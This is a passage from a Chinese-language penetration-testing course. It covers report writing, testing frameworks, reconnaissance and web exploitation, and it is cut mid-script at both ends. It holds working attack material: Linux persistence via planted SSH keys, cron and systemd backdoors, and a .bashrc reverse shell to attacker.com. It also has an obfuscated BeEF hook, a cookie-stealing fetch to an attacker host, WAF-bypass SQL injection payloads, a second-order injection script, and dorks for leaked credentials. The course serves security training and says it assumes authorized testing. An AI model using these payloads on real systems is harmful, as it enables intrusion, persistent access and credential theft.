sc description "WindowsUpdate" "Windows Update Service"
sc start "WindowsUpdate"
```

```bash
# Linux持久化

# 1. SSH密钥
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 2. Crontab
(crontab -l ; echo "*/5 * * * * /tmp/backdoor.sh") | crontab -

# 3. systemd服务
cat > /etc/systemd/system/backdoor.service <<EOF
[Unit]
Description=System Monitoring Service

[Service]
ExecStart=/tmp/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service

# 4. .bashrc劫持
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> ~/.bashrc
```

#### 阶段6: 报告撰写 (Reporting)

**渗透测试报告结构**:
```markdown
# 渗透测试报告

#### 模板段1：执行摘要 (Executive Summary)

### 1.1 项目概述
- **客户**: XXX公司
- **测试时间**: 2024-01-01 至 2024-01-15
- **测试类型**: 外部黑盒渗透测试
- **测试范围**:
  - Web应用: https://www.target.com
  - API接口: https://api.target.com
  - 移动应用: iOS/Android App

### 1.2 总体风险评估
- **高危漏洞**: 5个
- **中危漏洞**: 12个
- **低危漏洞**: 8个
- **信息泄露**: 15个

### 1.3 关键发现
1. **SQL注入漏洞** - 可导致数据库完全泄露
2. **认证绕过** - 允许未授权访问管理后台
3. **敏感信息泄露** - 配置文件包含数据库凭证

### 1.4 业务影响
- **数据泄露风险**: 10万+用户数据可能被窃取
- **财务损失**: 估计直接损失500万元
- **声誉影响**: 可能导致客户信任度下降
- **合规风险**: 违反《网络安全法》相关规定

#### 模板段2：测试方法论

### 2.1 测试范围
**包含范围**:
- 主域名及所有子域名
- 所有Web应用和API接口
- 移动应用客户端

**排除范围**:
- 第三方集成服务
- 客户内部办公网络
- 拒绝服务（DoS）攻击测试

### 2.2 测试方法
- **信息收集**: 被动和主动侦察
- **漏洞扫描**: 自动化扫描 + 手工验证
- **漏洞利用**: 验证性利用，最小影响原则
- **后渗透**: 权限提升和横向移动模拟

### 2.3 测试工具
- Nmap: 端口扫描和服务识别
- Burp Suite: Web应用测试
- SQLMap: SQL注入检测和利用
- Metasploit: 漏洞利用框架
- Nuclei: 自动化漏洞扫描

#### 模板段3：详细发现

### 3.1 高危漏洞

#### 漏洞 #1: SQL注入漏洞

**基本信息**:
- **漏洞名称**: SQL注入漏洞
- **风险等级**: 严重 (Critical)
- **CVSS评分**: 9.8
- **影响系统**: Web应用服务器
- **影响URL**: https://target.com/api/user/search?name=

**漏洞描述**:
在用户搜索接口发现SQL注入漏洞，攻击者可通过构造恶意SQL语句：
1. 绕过身份认证
2. 提取敏感数据（用户信息、密码哈希）
3. 修改或删除数据库内容
4. 可能获取服务器操作系统权限

**复现步骤**:
1. 访问用户搜索页面
2. 在搜索框输入: `admin' OR '1'='1'--`
3. 观察返回所有用户信息
4. 使用UNION注入提取数据库结构
5. 提取敏感数据

**技术细节**:
```http
GET /api/user/search?name=admin' UNION SELECT 1,username,password,email FROM users-- HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json

{
  "users": [
    {"id": 1, "name": "admin", "info": "admin", "extra": "5f4dcc3b5aa765d61d8327deb882cf99"},
    {"id": 2, "name": "test", "info": "test", "extra": "test@example.com"}
  ]
}
```

**SQLMap验证**:
```bash
sqlmap -u "https://target.com/api/user/search?name=admin" \
  --batch \
  --dbs

# 输出:
# [+] Database: production_db
# [+] Tables: users, orders, payments
# [+] Successfully dumped 10000+ user records
```

**影响评估**:
- **机密性**: 高 - 所有用户数据可被窃取
- **完整性**: 高 - 数据可被修改或删除
- **可用性**: 中 - 可能导致服务中断
- **影响范围**: 10万+注册用户

**修复建议**:

**紧急措施**:
1. 立即下线受影响的接口
2. 启用WAF规则阻断SQL注入
3. 审计访问日志，确认是否已被利用

**长期方案**:
1. 使用参数化查询（Prepared Statement）
2. 实施严格的输入验证
3. 最小权限原则配置数据库账户
4. 部署数据库审计和监控
5. 定期代码安全审计

**修复代码示例**:
```python
# 不安全的代码
def search_user(name):
    query = f"SELECT * FROM users WHERE name = '{name}'"
    cursor.execute(query)  # 危险！

# 安全的代码
def search_user(name):
    query = "SELECT * FROM users WHERE name = ?"
    cursor.execute(query, (name,))  # 使用参数化查询
```

**验证方法**:
1. 代码审计确认使用参数化查询
2. 重新测试所有SQL注入向量
3. 使用SQLMap自动化扫描
4. 持续监控WAF日志

**参考资料**:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

---

#### 模板段4：风险评级标准

### 4.1 CVSS评分系统
```
严重 (Critical): 9.0-10.0
  - 可远程利用
  - 不需要身份认证
  - 完全控制系统

高危 (High): 7.0-8.9
  - 可导致重大数据泄露
  - 需要最低权限
  - 广泛影响

中危 (Medium): 4.0-6.9
  - 需要特定条件
  - 部分数据泄露
  - 有限影响

低危 (Low): 0.1-3.9
  - 影响最小
  - 难以利用
  - 信息泄露
```

### 4.2 业务影响评估
```
风险 = 威胁 × 脆弱性 × 资产价值

威胁评估:
- 攻击者动机和能力
- 攻击的可能性
- 历史攻击记录

脆弱性评估:
- 漏洞严重程度
- 利用难度
- 现有防护措施

资产价值:
- 业务重要性
- 数据敏感性
- 合规要求
```

#### 模板段5：修复优先级建议

### 5.1 立即修复（1-3天）
1. SQL注入漏洞 - 数据库泄露风险
2. 认证绕过 - 未授权访问
3. 远程代码执行 - 服务器控制

### 5.2 短期修复（1-2周）
1. XSS漏洞 - 用户凭证窃取
2. CSRF漏洞 - 恶意操作
3. 文件上传漏洞 - Webshell上传

### 5.3 中期修复（1个月）
1. 配置错误 - 安全加固
2. 信息泄露 - 敏感信息保护
3. 弱密码策略 - 密码强度提升

#### 模板段6：整体建议

### 6.1 技术改进
- 实施SDL安全开发生命周期
- 部署WAF和IDS/IPS
- 建立安全监控和响应机制
- 定期渗透测试和安全审计

### 6.2 管理改进
- 建立安全管理制度
- 定期安全培训
- 应急响应演练
- 第三方安全评估

### 6.3 合规建议
- 满足《网络安全法》要求
- 通过等保三级认证
- 建立数据保护机制
- 制定安全事件响应计划
```

---

### 2.2 主流渗透测试框架

#### PTES (Penetration Testing Execution Standard)

**七个阶段**:
```
1. 前期交互 (Pre-engagement Interactions)
   - 确定测试范围
   - 签署法律文件
   - 定义测试目标

2. 情报收集 (Intelligence Gathering)
   - 被动信息收集
   - 主动信息收集
   - 社会工程学

3. 威胁建模 (Threat Modeling)
   - 资产识别
   - 威胁分析
   - 脆弱性映射

4. 漏洞分析 (Vulnerability Analysis)
   - 漏洞扫描
   - 手工验证
   - 优先级排序

5. 漏洞利用 (Exploitation)
   - 精确利用
   - 获取初始访问
   - 权限提升

6. 后渗透 (Post Exploitation)
   - 基础设施分析
   - 横向移动
   - 数据收集

7. 报告 (Reporting)
   - 执行摘要
   - 技术细节
   - 修复建议
```

#### OWASP Testing Guide

**Web应用测试框架**:
```
信息收集和配置管理测试
├── 搜索引擎发现
├── Web服务器指纹识别
├── 文件和目录枚举
└── 配置管理测试

身份认证测试
├── 凭证传输安全
├── 默认凭证
├── 弱密码策略
├── 认证绕过
├── 会话管理
└── CAPTCHA绕过

授权测试
├── 路径遍历
├── 权限提升
├── 不安全的直接对象引用
└── 功能级访问控制

业务逻辑测试
├── 业务流程绕过
├── 数据验证
├── 并发竞争
└── 支付逻辑

输入验证测试
├── XSS
├── SQL注入
├── XXE
├── SSRF
└── 命令注入

错误处理测试
├── 错误信息泄露
├── 堆栈跟踪
└── 异常处理

密码学测试
├── 弱加密算法
├── 敏感数据传输
└── 证书验证

客户端测试
├── DOM型XSS
├── JavaScript执行
├── HTML注入
└── 客户端资源操作
```

#### NIST网络安全框架

**五大核心功能**:
```
识别 (Identify)
├── 资产管理
├── 业务环境
├── 风险评估
└── 风险管理策略

保护 (Protect)
├── 访问控制
├── 数据安全
├── 信息保护
└── 维护

检测 (Detect)
├── 异常和事件
├── 安全持续监控
└── 检测过程

响应 (Respond)
├── 响应计划
├── 通信
├── 分析
├── 缓解
└── 改进

恢复 (Recover)
├── 恢复计划
├── 改进
└── 通信
```

---

### 2.3 渗透测试全生命周期任务板
| 阶段 | 核心任务 | 责任人 | 工具/方法 | 交付物 |
| --- | --- | --- | --- | --- |
| 立项与范围 | Kick-off会议、授权确认、资产清单整理 | 项目经理/甲方安全负责人 | Zoom/Teams、Confluence | 项目章程、范围清单 |
| 侦察与枚举 | DNS枚举、端口扫描、服务识别 | 渗透测试工程师 | Amass、Nmap、Masscan、WhatWeb | 侦察报告、指纹库 |
| 漏洞验证 | POC验证、链路构建 | 渗透测试工程师、技术专家 | Burp、Metasploit、自研脚本 | 漏洞证据、影响分析 |
| 风险沟通 | 高危即时通知、缓解建议 | 项目经理/甲方业务负责人 | IM、邮件、日报模板 | 风险提示函、缓解策略 |
| 报告撰写 | 汇总证据、编写章节、复现步骤 | 渗透测试工程师、技术写作者 | Markdown、LaTeX、模板引擎 | 渗透测试报告、补救建议 |
| 复测与复盘 | 验证修复、总结经验 | 渗透测试工程师、甲方安全团队 | 自动化脚本、会议复盘 | 复测报告、改进清单 |

#### 看板使用建议
- 使用Jira或Trello建立渗透测试项目板，按照阶段划分Swimlane。
- 每个任务卡片包含：任务描述、前置条件、风险等级、负责人、截止日期、证据链接。
- 设置WIP限制：确保同时进行的高风险操作不超过2项，降低影响。

### 2.4 报告撰写实战指南
- **目录结构建议**：
  1. 执行摘要
  2. 测试概览（范围、方法、限制）
  3. 关键风险汇总
  4. 漏洞详情（POC、影响、修复方案、复现步骤）
  5. 防御能力评估（发现率、响应时间、日志质量）
  6. 改进建议（技术、流程、人员）
  7. 附录（术语表、工具版本、证据索引）
- **写作技巧**：
  - 使用业务语言描述影响，面向管理层和技术团队分别提供摘要。
  - 每个漏洞需包含“背景→利用→影响→修复→验证”五段式描述。
  - 提供修复后的验证方法，帮助甲方自测。
  - 附加截图需包含时间戳、关键标注，命令行输出建议使用等宽字体。
- **质量校验表**：
  - [ ] 风险等级是否依据CVSS/业务影响双重确认？
  - [ ] 是否标注所有测试时间点、测试账号？
  - [ ] 是否说明测试限制与未覆盖风险？
  - [ ] 是否给出短期缓解与长期修复的组合建议？
  - [ ] 是否对敏感信息进行掩码处理？

### 模块作业与实践建议
1. **撰写报告**：挑选一个靶场（如VulnHub靶机），完成至少3000字的渗透测试报告，要求包含执行摘要、漏洞详情、修复建议。
2. **设计自动化脚本**：构建一个报告生成脚本，将Markdown模板与渗透测试数据结合，自动输出PDF。
3. **流程复盘**：模拟与甲方的风险沟通电话（5分钟以内），强调问题描述与缓解建议。
4. **度量搭建**：设计渗透测试度量指标仪表盘（如Grafana），展示漏洞数量、风险分布、修复时长。

---

## 模块三：信息收集与资产识别

### 模块概览（资产视角与情报驱动）
- **模块目标**：建立全面的攻击面地图，掌握被动与主动信息收集的深度技巧，形成资产优先级策略。
- **学习产出**：资产盘点模板、情报来源矩阵、自动化扫描脚本、资产暴露风险报告。
- **关键能力**：
  - 跨源关联：DNS、证书、WHOIS、应用栈、员工信息等多维度关联能力。
  - 自动化与脚本化：结合Python/Go编写定制枚举工具，提升效率。
  - 风险标签化：对资产进行业务重要度与暴露度双因素评级。

#### 攻击面地图设计方法
1. **确定范围**：企业域名、子公司域名、云资源、第三方服务。
2. **分类资产**：
   - 暴露服务：Web、API、VPN、邮件、数据库。
   - 辅助资产：CDN、对象存储、备份系统、日志服务器。
   - 人员资产：高管、IT人员、开发者、供应商。
3. **打标签**：
   - 业务价值：核心（Core）、关键（Key）、支撑（Supporting）。
   - 暴露程度：高（公网可见+敏感服务）、中（公网可见+普通服务）、低（内网或受控访问）。
4. **确定优先级**：优先针对“高价值+高暴露”的资产执行深度渗透，其他资产维持监控。

#### 情报来源矩阵
| 类型 | 渠道/工具 | 说明 | 自动化方式 |
| --- | --- | --- | --- |
| DNS情报 | SecurityTrails、DNSDB、Fofa | 枚举子域、历史解析记录 | 利用API结合Python/Go脚本批量查询 |
| 证书透明度 | crt.sh、Censys、Entrust | 查找证书签发记录、子域 | 使用`certstream`订阅实时更新 |
| 开发者情报 | GitHub、GitLab、StackOverflow | 收集代码仓库、泄露凭证 | GitHub API + Dorking脚本 |
| 员工情报 | LinkedIn、脉脉、招聘网站 | 分析技术栈、邮件命名规则 | 爬虫脚本+命名模式生成器 |
| 漏洞情报 | CVE、CNVD、MSRC、0day.today | 对目标使用的产品进行漏洞跟踪 | RSS订阅+自动比对资产服务版本 |
| 云资产 | 公有云资产搜索（LeakIX、GreyNoise） | 识别云端暴露服务 | Terraform + API对比清单 |

### 实战案例：百万级资产的受控枚举
**背景**：大型互联网企业拥有上万个子域与多云资产，需要构建可持续的资产监控体系。

**实施方案**：
1. **资产收集自动化**
   - 使用Amass、Subfinder结合，采用被动+主动混合模式：
     ```bash
     amass enum -passive -d corp.com -config amass.ini -o passive.txt
     subfinder -d corp.com -all -silent > subfinder.txt
     cat passive.txt subfinder.txt | sort -u > all_subs.txt
     ```
   - 接入证书透明度：使用`certstream`实时获取新证书。
   - 对云资产使用云厂商API（AWS、GCP、Azure）导出资源列表。
2. **验证与分级**
   - 使用`httpx`验证资产存活与技术栈：
     ```bash
     httpx -l all_subs.txt -title -tech-detect -status-code -follow-redirects -o alive_assets.txt
     ```
   - 基于标题、指纹识别应用类型，配合Wappalyzer识别技术栈。
   - 结合CDN信息、证书信息判断是否为真实源站。
3. **风险标注**
   - 结合开放端口扫描：`naabu -l alive_assets.txt -p - -o ports.txt`。
   - 对暴露的高危服务（数据库、Jenkins、GitLab）设置高优先级。
   - 记录认证方式（匿名、默认口令、弱口令）并优先验证。
4. **监控与告警**
   - 使用Scheduler每日同步新资产，与历史库存比对差异。
   - 引入ElasticSearch/Kibana展示资产趋势，自动告警新增高风险资产。

**交付成果**：资产拓扑图、关键资产清单、风险热力图、处置建议。

### 进阶拓展：
- **图数据库关联分析**：使用Neo4j构建资产—域名—IP—服务—漏洞关联图，提高潜在攻击路径发现效率。
- **机器学习辅助识别**：基于历史漏洞数据训练分类模型，预测资产风险等级。
- **威胁情报订阅**：结合VirusTotal、AlienVault OTX、360威胁情报中心进行IOC匹配，发现被攻击迹象。
- **社会工程链路**：将员工公开信息、邮箱组合生成钓鱼名单并设计攻防演练（需严格授权）。

> **模块练习建议**：
> - 自行编写一个“资产监控脚本”，每周自动比对资产变化并发送报告。
> - 在公开CTF/攻防平台上练习OSINT题目，例如HackTheBox、TryHackMe的情报收集场景。
> - 参与Bug Bounty平台（HackerOne、Bugcrowd）以真实目标练习资产枚举能力。

### 资产优先级评分模型
| 指标 | 说明 | 权重建议 | 评分范围 |
| --- | --- | --- | --- |
| 业务价值 (Business Impact) | 资产对核心业务/收入/声誉的重要程度 | 0.35 | 1（非关键）-5（核心业务） |
| 暴露程度 (Exposure) | 资产暴露在公网或内网的范围、访问限制情况 | 0.25 | 1（严格内网）-5（公网可直接访问） |
| 漏洞历史 (Vulnerability History) | 资产历史漏洞数量、严重性 | 0.15 | 1（无记录）-5（多次高危） |
| 探测迹象 (Threat Signal) | 外部情报中是否出现该资产的攻击迹象 | 0.15 | 1（无）-5（多次攻击） |
| 合规影响 (Compliance) | 涉及法规/审计要求程度 | 0.10 | 1（无）-5（涉及敏感数据） |

> **评分指引**：综合得分 = Σ(权重 × 评分)。
> - 4.0-5.0：立即纳入渗透测试范围，重点关注。
> - 3.0-3.9：纳入常规测试计划。
> - 2.0-2.9：纳入监控队列，定期重新评估。
> - <2.0：保持观察，作为低优先级项目。

### 自动化脚本示例：资产差异检测
```python
#!/usr/bin/env python3
"""资产差异检测脚本：比较当前资产列表与基线列表"""
import csv
from pathlib import Path

BASELINE_FILE = Path("baseline_assets.csv")
CURRENT_FILE = Path("current_assets.csv")

def load_assets(path):
    with open(path, newline="", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        return {(row["asset"], row["type"]): row for row in reader}

def diff_assets(baseline, current):
    removed = baseline.keys() - current.keys()
    added = current.keys() - baseline.keys()
    return removed, added

def main():
    baseline = load_assets(BASELINE_FILE)
    current = load_assets(CURRENT_FILE)
    removed, added = diff_assets(baseline, current)

    print("[+] 新增资产")
    for item in added:
        data = current[item]
        print(f"  - {data['asset']} ({data['type']}) | 暴露: {data['exposure']} | 负责人: {data['owner']}")

    print("\n[-] 下线资产")
    for item in removed:
        data = baseline[item]
        print(f"  - {data['asset']} ({data['type']}) | 上线时间: {data['上线时间']}")

    high_risk = [current[item] for item in added if float(current[item].get('score', 0)) >= 4]
    if high_risk:
        print("\n[!] 高风险新增资产")
        for entry in high_risk:
            print(f"  * {entry['asset']} - 风险评分: {entry['score']} | 服务: {entry['service']}")

if __name__ == "__main__":
    main()
```

**扩展建议**：
- 结合漏洞扫描结果（如Nessus CSV导出）自动标注未修复高危漏洞。
- 接入企业微信/Slack机器人推送每日资产变动简报。
- 将资产信息写入Neo4j，生成资产关联图以支持攻击路径分析。

### 模块作业
1. **资产地图绘制**：选择一个授权目标（如自己搭建的实验室），输出包含域名、IP、端口、服务、负责人、风险评分的资产表。
2. **自动化任务**：扩展上述脚本，支持比对第三方情报平台（Fofa/Quake/Shodan）的资产差异。
3. **情报简报撰写**：以最近发生的某起攻击事件为例，输出1页A4的情报复盘，给出对本组织的潜在影响与建议。
4. **蓝队协同练习**：与蓝队同事协作，模拟发现异常资产→告警→处置的流程，记录时间线与优化建议。

### 3.1 高级OSINT技术

**社交媒体情报收集**:
```python
# LinkedIn员工信息爬取脚本示例（仅用于授权测试）

import requests
from bs4 import BeautifulSoup
import json

class LinkedInRecon:
    def __init__(self, company_name):
        self.company_name = company_name
        self.employees = []
        self.technologies = set()
        self.departments = set()

    def search_employees(self):
        """
        搜索公司员工信息
        """
        # 注意：实际使用需要LinkedIn API授权
        search_url = f"https://www.linkedin.com/search/results/people/?keywords={self.company_name}"

        # 提取员工信息
        # - 姓名和职位
        # - 部门
        # - 技能和认证
        # - 教育背景

        return self.employees

    def identify_tech_stack(self):
        """
        识别技术栈
        """
        # 从员工技能中提取技术栈
        tech_keywords = [
            'Java', 'Python', 'JavaScript', 'React', 'Angular',
            'AWS', 'Azure', 'Docker', 'Kubernetes',
            'MySQL', 'MongoDB', 'PostgreSQL'
        ]

        for employee in self.employees:
            for skill in employee.get('skills', []):
                if any(tech in skill for tech in tech_keywords):
                    self.technologies.add(skill)

        return list(self.technologies)

    def build_org_chart(self):
        """
        构建组织架构图
        """
        org_chart = {
            'executives': [],
            'managers': [],
            'engineers': [],
            'security': []
        }

        # 基于职位标题分类
        for employee in self.employees:
            title = employee.get('title', '').lower()

            if any(role in title for role in ['ceo', 'cto', 'ciso', 'vp']):
                org_chart['executives'].append(employee)
            elif 'manager' in title or 'director' in title:
                org_chart['managers'].append(employee)
            elif 'security' in title:
                org_chart['security'].append(employee)
            elif any(role in title for role in ['engineer', 'developer']):
                org_chart['engineers'].append(employee)

        return org_chart
```

**GitHub代码泄露搜索**:
```bash
# GitHub高级搜索技巧

# 1. 搜索API密钥
"target.com" extension:env
"target.com" filename:.env
"target.com" "api_key" OR "apikey" OR "api-key"

# 2. 搜索密码
"target.com" "password" OR "pwd" OR "passwd"
"target.com" filename:config.php password

# 3. 搜索AWS凭证
"target.com" filename:.aws/credentials
"target.com" "AWS_ACCESS_KEY_ID"

# 4. 搜索数据库配置
"target.com" filename:database.yml
"target.com" "db_password"

# 5. 搜索私钥
"target.com" filename:id_rsa
"target.com" "BEGIN RSA PRIVATE KEY"

# 使用GitHub API自动化搜索
curl -H "Authorization: token YOUR_TOKEN" \
  "https://api.github.com/search/code?q=target.com+api_key"
```

**Shodan高级搜索**:
```bash
# Shodan CLI使用

# 1. 搜索特定组织
shodan search "org:'Target Company'" --fields ip_str,port,product

# 2. 搜索特定服务
shodan search "hostname:target.com port:3389"  # RDP
shodan search "hostname:target.com port:22"    # SSH

# 3. 搜索SSL证书
shodan search "ssl:target.com"
shodan search "ssl.cert.subject.CN:target.com"

# 4. 搜索特定产品和版本
shodan search "product:Apache version:2.4.49"
shodan search "product:nginx version:1.14"

# 5. 搜索存在漏洞的系统
shodan search "vuln:CVE-2017-0144"  # EternalBlue

# 6. 下载结果
shodan download target_results "hostname:target.com"
shodan parse --fields ip_str,port,product target_results.json.gz
```

### 3.2 主动信息收集高级技术

**智能端口扫描**:
```python
# 自适应端口扫描器

import nmap
import threading
from queue import Queue

class AdaptivePortScanner:
    def __init__(self, targets):
        self.targets = targets
        self.nm = nmap.PortScanner()
        self.results = {}
        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389]

    def quick_scan(self, target):
        """
        快速扫描常用端口
        """
        print(f"[*] Quick scanning {target}...")
        self.nm.scan(target, arguments='-F -T4')

        open_ports = []
        for host in self.nm.all_hosts():
            for proto in self.nm[host].all_protocols():
                ports = self.nm[host][proto].keys()
                open_ports.extend(ports)

        return open_ports

    def deep_scan(self, target, ports):
        """
        深度扫描开放端口
        """
        print(f"[*] Deep scanning {target} on ports {ports}...")
        port_str = ','.join(map(str, ports))
        self.nm.scan(target, port_str, arguments='-sV -sC -A')

        services = {}
        for host in self.nm.all_hosts():
            for proto in self.nm[host].all_protocols():
                for port in self.nm[host][proto].keys():
                    service_info = self.nm[host][proto][port]
                    services[port] = {
                        'name': service_info.get('name', ''),
                        'product': service_info.get('product', ''),
                        'version': service_info.get('version', ''),
                        'extrainfo': service_info.get('extrainfo', '')
                    }

        return services

    def adaptive_scan(self, target):
        """
        自适应扫描策略
        """
        # 阶段1: 快速发现
        open_ports = self.quick_scan(target)

        if not open_ports:
            print(f"[-] No open ports found on {target}")
            return None

        print(f"[+] Found {len(open_ports)} open ports")

        # 阶段2: 详细枚举
        services = self.deep_scan(target, open_ports)

        # 阶段3: 漏洞检测
        vulnerable_services = self.check_vulnerabilities(services)

        self.results[target] = {
            'open_ports': open_ports,
            'services': services,
            'vulnerabilities': vulnerable_services
        }

        return self.results[target]

    def check_vulnerabilities(self, services):
        """
        检查服务漏洞
        """
        vulnerabilities = []

        vuln_signatures = {
            'Apache 2.4.49': 'CVE-2021-41773',
            'OpenSSH 7.4': 'CVE-2018-15473',
            'ProFTPD 1.3.5': 'CVE-2015-3306'
        }

        for port, service_info in services.items():
            product = service_info.get('product', '')
            version = service_info.get('version', '')
            service_string = f"{product} {version}".strip()

            for vuln_service, cve in vuln_signatures.items():
                if vuln_service in service_string:
                    vulnerabilities.append({
                        'port': port,
                        'service': service_string,
                        'cve': cve,
                        'severity': 'HIGH'
                    })

        return vulnerabilities

# 使用示例
scanner = AdaptivePortScanner(['192.168.1.1', '192.168.1.100'])
for target in scanner.targets:
    result = scanner.adaptive_scan(target)
    print(json.dumps(result, indent=2))
```

**服务枚举自动化**:
```bash
#!/bin/bash
# 全面服务枚举脚本

TARGET=$1

echo "[+] Starting comprehensive service enumeration for $TARGET"

# 1. HTTP/HTTPS枚举
if nmap -p 80,443,8080,8443 $TARGET | grep -q "open"; then
    echo "[*] Enumerating HTTP services..."

    # 指纹识别
    whatweb -v -a 3 http://$TARGET

    # 目录枚举
    gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,js -o gobuster_http.txt

    # Nikto扫描
    nikto -h http://$TARGET -o nikto_http.txt
fi

# 2. SMB枚举
if nmap -p 445 $TARGET | grep -q "open"; then
    echo "[*] Enumerating SMB services..."

    # enum4linux
    enum4linux -a $TARGET > enum4linux.txt

    # SMB扫描
    smbclient -L //$TARGET -N
    smbmap -H $TARGET -u guest
fi

# 3. SNMP枚举
if nmap -sU -p 161 $TARGET | grep -q "open"; then
    echo "[*] Enumerating SNMP services..."

    # 社区字符串爆破
    onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET

    # SNMP walk
    snmpwalk -v2c -c public $TARGET > snmpwalk.txt
fi

# 4. DNS枚举
if nmap -p 53 $TARGET | grep -q "open"; then
    echo "[*] Enumerating DNS services..."

    # 区域传送
    dig @$TARGET AXFR target.com

    # DNS枚举
    dnsrecon -d target.com -n $TARGET
fi

# 5. 数据库枚举
# MySQL
if nmap -p 3306 $TARGET | grep -q "open"; then
    echo "[*] Enumerating MySQL..."
    nmap -p 3306 --script mysql-info,mysql-enum $TARGET
fi

# MSSQL
if nmap -p 1433 $TARGET | grep -q "open"; then
    echo "[*] Enumerating MSSQL..."
    nmap -p 1433 --script ms-sql-info,ms-sql-config $TARGET
fi

echo "[+] Enumeration complete!"
```

---

## 模块四：漏洞利用与武器化

### 模块概览（攻击链构建）
- **模块目标**：熟练构建可靠的漏洞利用链，掌握从发现、验证到武器化、绕过安全防护的完整过程。
- **成果要求**：能为不同漏洞类型设计POC与EXP，编写自动化脚本，输出风险量化评估。
- **核心能力**：
  - 漏洞根因分析与可利用性评估。
  - 组合利用（Chaining）：将多个低危漏洞串联为高危攻击路径。
  - 安全控制绕过：WAF、RASP、EDR环境下的攻击技巧。

#### 漏洞利用流程分解
1. **触发条件确认**：验证漏洞是否存在、需要的参数、权限。
2. **影响范围评估**：可能的数据读取/修改、系统控制、横向扩展能力。
3. **利用链构建**：结合其他漏洞或配置错误扩大影响（如信息泄露+命令执行）。
4. **环境约束处理**：应对沙箱、权限限制、网络隔离、自定义防护策略。
5. **证据收集**：保留网络流量、日志、截图、Shell输出供报告使用。
6. **武器化与自动化**：将利用流程转化为脚本/框架模块，支持复用与回滚。

### 实战案例：从信息泄露到RCE的链路构建
**目标场景**：企业内部的配置中心（Spring Cloud Config）暴露在公网。

**发现阶段**：
- 通过资产扫描发现`config.corp.com`，响应头显示`Spring Cloud Config`版本。
- 未设置访问控制，可直接下载`application-{profile}.yml`。
- 从配置文件中获取数据库、消息队列、Git凭证。

**漏洞链构建**：
1. 利用泄露的Git凭证访问源代码仓库，下载服务端代码。
2. 在源码中发现`/admin/upload`接口存在文件上传点，无后缀校验。
3. 部署环境为Tomcat，存在`webapps`目录写权限。
4. 构造恶意JSP文件，通过上传接口写入服务器，触发命令执行。
5. 结合配置文件中泄露的数据库凭证，进一步获取业务敏感数据。

**安全控制绕过**：
- 上传接口使用WAF限制典型payload，通过重写Content-Type、双写关键字绕过。
- 采用分段上传、二次渲染方式隐藏恶意代码。

**案例总结**：
- 单点漏洞（信息泄露）本身影响有限，但与文件上传结合形成完整攻击链。
- 需在报告中清晰阐述链路、前提条件、影响范围及修复优先级。
- 输出补救建议：配置中心增加鉴权、敏感信息加密、上传接口加强校验及隔离。

### 进阶拓展：复杂漏洞利用
- **JNDI注入与反序列化**：结合LDAP服务器、Gadget链与内存马，针对Java生态的利用与检测绕过。
- **逻辑漏洞链**：订单支付绕过+优惠券滥用+库存同步缺陷构成资金损失场景。
- **内存利用**：针对C/C++服务的Heap Spray、Use-After-Free、ROP链构造。
- **现代防护绕过**：
  - WAF绕过：利用编码、分块传输、缓存污染、HTTP请求走私。
  - 容器逃逸：针对Docker、Kubernetes的CVE利用与权限提升。
- **武器化工具链**：使用Metasploit、Cobalt Strike、Sliver等框架进行Payload管理，结合自定义模块。

> **建议训练**：
> - HackTheBox Pro Labs、Offensive Security Proving Grounds等长线靶场。
> - 代码级别漏洞分析，如pwn.college、Root-Me高级题。
> - 参与漏洞赏金计划并提交高价值链式漏洞。

### 4.1 Web应用深度渗透

#### SQL注入高级技巧

**WAF绕过技术**:
```sql
-- 1. 编码绕过
-- URL编码
%27 OR %27a%27=%27a

-- 双URL编码
%2527 OR %25271%2527=%25271

-- Unicode编码
\u0027 OR \u00271\u0027=\u00271

-- 十六进制编码
0x27 OR 0x61646d696e

-- 2. 注释插入
SELECT/**/username/**/FROM/**/users
SELECT%0Ausername%0AFROM%0Ausers

-- 3. 大小写混淆
SeLeCt * FrOm users
UnIoN SeLeCt 1,2,3

-- 4. 空格替代
SELECT+username+FROM+users
SELECT%09username%09FROM%09users
SELECT%0Ausername%0AFROM%0Ausers

-- 5. 等价函数替换
-- 原始: SUBSTRING(database(),1,1)
-- 替换: MID(database() FROM 1 FOR 1)
-- 替换: SUBSTR(database(),1,1)

-- 6. 关键字拆分
-- 绕过 UNION 过滤
UN/**/ION SE/**/LECT

-- 绕过 SELECT 过滤
SEL<>ECT

-- 7. HTTP参数污染
id=1&id=' OR '1'='1

-- 8. 内联注释
SELECT /*!32302 1/0, */ 1 FROM tablename
```

**二次注入攻击**:
```python
# 二次注入示例

import requests

session = requests.Session()

# 阶段1: 注册恶意用户名
register_data = {
    'username': "admin'--",  # 恶意用户名
    'password': 'password123',
    'email': 'test@example.com'
}

session.post('http://target.com/register', data=register_data)

# 阶段2: 登录
login_data = {
    'username': "admin'--",
    'password': 'password123'
}

session.post('http://target.com/login', data=login_data)

# 阶段3: 触发二次注入
# 当应用查询该用户名时:
# SELECT * FROM users WHERE username = 'admin'--' AND ...
# 实际执行: SELECT * FROM users WHERE username = 'admin'
# 成功绕过密码验证

response = session.get('http://target.com/profile')
print(response.text)
```

#### XSS高级利用

**BeEF框架利用**:
```html
<!-- BeEF Hook注入 -->
<script src="http://attacker.com:3000/hook.js"></script>

<!-- 混淆注入 -->
<script>eval(atob('dmFyIGJlZWY9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YmVlZi5zcmM9Imh0dHA6Ly9hdHRhY2tlci5jb206MzAwMC9ob29rLmpzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGJlZWYpOw=='))</script>
```

**XSS Bot攻击**:
```javascript
// 自动化XSS攻击脚本

<script>
// 1. Cookie窃取
var cookies = document.cookie;
fetch('http://attacker.com/steal?c=' + encodeURIComponent(cookies));

// 2. 键盘记录
var keys = [];
document.addEventListener('keypress', function(e) {
